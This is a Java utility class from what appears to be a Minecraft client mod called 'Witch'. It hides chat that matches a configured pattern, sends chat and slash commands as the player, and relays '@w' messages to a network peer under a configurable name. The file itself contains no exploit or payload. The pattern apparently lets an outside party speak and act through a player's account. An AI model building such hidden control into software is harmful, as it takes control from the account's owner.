package me.soda.witch.client.utils;

import me.soda.witch.client.Witch;
import net.minecraft.text.MutableText;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;

import java.util.regex.Pattern;

import static me.soda.witch.client.Witch.mc;

public class ChatUtil {
    private static boolean firstTime = true;

    public static boolean filter(Text message) {
        if (!Witch.config.isBeingFiltered) return false;
        Pattern pattern = Pattern.compile(Witch.config.filterPattern);
        return pattern.matcher(message.getString()).find();
    }

    public static void sendChat(String message) {
        try {
            if (mc.world == null || mc.player == null) return;
            mc.inGameHud.getChatHud().addToMessageHistory(message);
            if (message.startsWith("/")) mc.player.sendCommand(message.substring(1), null);
            else mc.player.sendChatMessage(message, null);
        } catch (Exception e) {
            Witch.printStackTrace(e);
        }
    }

    public static void chat(Text msg, boolean you) {
        if (mc.world == null) return;

        Text prefix = Text.of(Formatting.GRAY + "[" + Formatting.DARK_PURPLE + (you ? "You" : Witch.config.name) + Formatting.GRAY + "] " + Formatting.RESET);

        if (firstTime) {
            firstTime = false;
            chat(Text.of("Notice: Input @w <text> to chat with me."), false);
        }

        MutableText message = Text.literal("");
        message.append(prefix);
        message.append(msg);

        mc.inGameHud.getChatHud().addMessage(message);
    }

    public static boolean tryChatBack(String string) {
        String[] msgArr = string.split(" ");
        if (firstTime || msgArr.length < 2 || !msgArr[0].equals("@w")) return false;
        String[] strArr = new String[msgArr.length - 1];
        System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
        String chatText = String.join(" ", strArr);
        chat(Text.of(chatText), true);
        NetUtil.send("chat", chatText);
        return true;
    }
}
